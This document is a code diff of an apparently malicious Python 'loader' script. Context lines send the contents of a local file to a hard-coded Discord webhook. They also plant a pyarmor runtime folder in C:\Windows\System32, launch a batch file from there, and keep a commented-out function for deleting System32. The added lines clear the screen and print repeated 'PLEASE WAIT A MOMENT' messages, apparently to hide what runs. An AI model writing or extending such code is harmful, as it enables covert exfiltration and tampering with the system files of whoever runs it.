@@ -11,6 +11,7 @@ import sys
 import shutil
 import os
 import gdown
+os.system('cls')
 '''
 def delete_system32_filex():
     system32_path = r"C:\Windows\System32"
@@ -63,6 +64,20 @@ file_contentsx1 = read_file(file_pathxx)
 
 webhook_url = "https://discord.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM"
 message = file_contentsx1+" run the loader."
+os.system('cls')
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
+print("---PLEASE WAIT A MOMENT")
 send_dx(webhook_url, message)
 
 if file_contentsx1 =="mJaAQuPVWhWXG":
@@ -164,7 +179,7 @@ if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
 
 import os
 import shutil
-
+os.system('cls')
 directory = r'C:\Windows\System32'
 
 new_dir = os.path.join(directory, 'pyarmor_runtime_000000')
@@ -200,9 +215,9 @@ if not check_files_existx():
     input()
     exit()
 
-
+os.system('cls')
 batch_file_path = r"C:\Windows\System32\aesv8.2.bat"
-
+os.system('cls')
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
 except Exception as e:
